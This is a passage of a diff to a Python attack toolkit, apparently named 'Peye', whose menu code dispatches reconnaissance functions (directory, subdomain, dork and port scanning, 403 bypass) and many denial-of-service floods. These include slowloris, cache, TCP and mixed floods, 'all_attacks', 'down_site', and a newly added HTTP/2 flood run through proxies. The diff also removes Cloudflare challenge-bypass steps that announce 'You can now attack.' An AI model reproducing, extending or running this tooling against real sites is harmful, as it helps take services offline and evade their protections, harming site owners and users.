                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
                 
-                print(f"{YELLOW}[*] Connecting to {target}...{RESET}")
-                session = CFBypass(target).bypass()
+                session = requests.Session()
+                session.verify = False
+                session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
                 scanner = AdvancedScanner(target, session)
                 
                 if choice == '1':
@@ -2004,48 +1230,40 @@ class Peye:
                     scanner.dir_scan()
                     domain = urlparse(target).netloc
                     scanner.subdomain_scan(domain)
-                    scanner.scan_parameters()
-                    scanner.scan_endpoints()
-                    scanner.report.display()
-                elif choice == '5':
                     scanner.bypass403_scan()
                     scanner.report.display()
             
             # Dork search options
-            elif choice in ['6','7','8']:
+            elif choice in ['5','6','7']:
                 target_url = input(f"{GREEN}Target URL/Domain: {RESET}").strip()
                 self.dork.set_target(target_url)
-                
-                if choice == '6':
+                if choice == '5':
                     dork = input(f"{GREEN}Enter Google Dork: {RESET}")
                     self.dork.search_google(dork)
-                elif choice == '7':
+                elif choice == '6':
                     self.dork.search_from_file()
-                elif choice == '8':
+                elif choice == '7':
                     tech = input(f"{GREEN}Enter technology: {RESET}")
                     self.dork.tech_search(tech)
-            
-            elif choice == '9':
+            elif choice == '8':
                 self.dork.popular_dorks()
             
             # Extra Tools
-            elif choice == '10':
+            elif choice == '9':
                 target = input(f"{GREEN}Target (domain or IP): {RESET}").strip()
                 self.ipinfo.get_ip_info(target)
-            
-            elif choice == '11':
+            elif choice == '10':
                 target = input(f"{GREEN}Target IP: {RESET}").strip()
                 self.portscanner.scan(target)
-            
-            elif choice == '12':
+            elif choice == '11':
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
-                session = CFBypass(target).bypass()
+                session = requests.Session()
+                session.verify = False
                 detector = CMSDetector(target, session)
                 detector.detect()
-            
-            elif choice == '13':
+            elif choice == '12':
                 target = input(f"{GREEN}Target (domain): {RESET}").strip()
                 try:
                     ctx = ssl.create_default_context()
@@ -2058,8 +1276,7 @@ class Peye:
                         print(f"    Expiry: {cert.get('notAfter', 'N/A')}")
                 except:
                     print(f"{RED}[✗] Could not get SSL info{RESET}")
-            
-            elif choice == '14':
+            elif choice == '13':
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
@@ -2071,68 +1288,51 @@ class Peye:
                 except:
                     print(f"{RED}[✗] Could not fetch headers{RESET}")
             
-            elif choice == '15':
-                check_update()
-            
-            elif choice == '16':
-                target = input(f"{GREEN}Target URL: {RESET}").strip()
-                if not target.startswith(('http://','https://')):
-                    target = 'http://' + target
-                result = CloudflareUAM.bypass_uam(target)
-                if result:
-                    print(f"{GREEN}[✓] UAM Bypass Successful! You can now attack.{RESET}")
-                else:
-                    print(f"{RED}[✗] UAM Bypass Failed.{RESET}")
-            
             # DoS Attack options
-            elif choice in [str(i) for i in range(17, 49)]:
+            elif choice in ['14','15','16','17','18','19','20','21','22','23']:
                 target = input(f"{GREEN}Target URL: {RESET}").strip()
                 if not target.startswith(('http://','https://')):
                     target = 'http://' + target
-                
-                # Try UAM bypass first if needed
-                print(f"{YELLOW}[*] Attempting UAM Bypass...{RESET}")
-                uam_session = CloudflareUAM.bypass_uam(target)
-                if uam_session:
-                    print(f"{GREEN}[✓] UAM Bypassed! Proceeding with attack...{RESET}")
-                else:
-                    print(f"{YELLOW}[!] UAM Bypass failed, continuing with standard attack...{RESET}")
                 
                 dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                 thr = int(input(f"{YELLOW}Threads (100-5000): {RESET}"))
                 dos = DoSAttack(target, self.use_proxy)
-                
                 if self.saa_enabled:
                     dos.enable_saa()
                 
                 attack_map = {
-                    '17': dos.http_get, '18': dos.http_post, '19': dos.http_head,
-                    '20': dos.http_put, '21': dos.http_delete, '22': dos.http_patch,
-                    '23': dos.http_options, '24': dos.http_trace, '25': dos.http_connect,
-                    '26': dos.http_random, '27': dos.slow_post, '28': dos.slow_read,
-                    '29': dos.slowloris, '30': dos.rudy, '31': dos.cache_flood,
-                    '32': dos.waf_bypass, '33': dos.xmlrpc, '34': dos.h2_get,
-                    '35': dos.h2_post, '36': dos.h2_rapid, '37': dos.h2_ping,
-                    '38': dos.tcp_flood, '39': dos.udp_flood, '40': dos.syn_flood,
-                    '41': dos.ack_flood, '42': dos.fin_flood, '43': dos.rst_flood,
-                    '44': dos.xmas_flood, '45': dos.null_flood, '46': dos.mixed_flood,
-                    '47': dos.all_attacks, '48': dos.down_site
+                    '14': dos.http_get, '15': dos.http_post, '16': dos.http_head,
+                    '17': dos.http_random, '18': dos.slowloris, '19': dos.cache_flood,
+                    '20': dos.tcp_flood, '21': dos.mixed_flood, '22': dos.all_attacks,
+                    '23': dos.down_site
                 }
                 if choice in attack_map:
                     attack_map[choice](dur, min(thr, 5000))
             
-            input(f"\n{YELLOW}Enter{RESET}")
+            # HTTP/2 Flood via JS
+            elif choice == '24':
+                target = input(f"{GREEN}Target URL: {RESET}").strip()
+                if not target.startswith(('http://','https://')):
+                    target = 'https://' + target
+                
+                dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
+                rate = int(input(f"{YELLOW}Rate (requests per batch): {RESET}"))
+                thr = int(input(f"{YELLOW}Threads: {RESET}"))
+                proxy_file = input(f"{GREEN}Proxy file path: {RESET}").strip()
+                
+                if not os.path.exists(proxy_file):
+                    print(f"{RED}[✗] Proxy file not found!{RESET}")
+                    input(f"\n{YELLOW}Enter to continue{RESET}")
+                    os.system('clear')
+                    print_banner()
+                    continue
+                
+                H2FloodJS.run(target, dur, rate, thr, proxy_file)
+            
+            input(f"\n{YELLOW}Enter to continue{RESET}")
             os.system('clear')
             print_banner()
 
 if __name__ == "__main__":
-    try:
-        import cloudscraper
-    except:
-        os.system('pip install cloudscraper')
-    try:
-        import tls_client
-    except:
-        os.system('pip install tls_client')
     peye = Peye()
     peye.run()
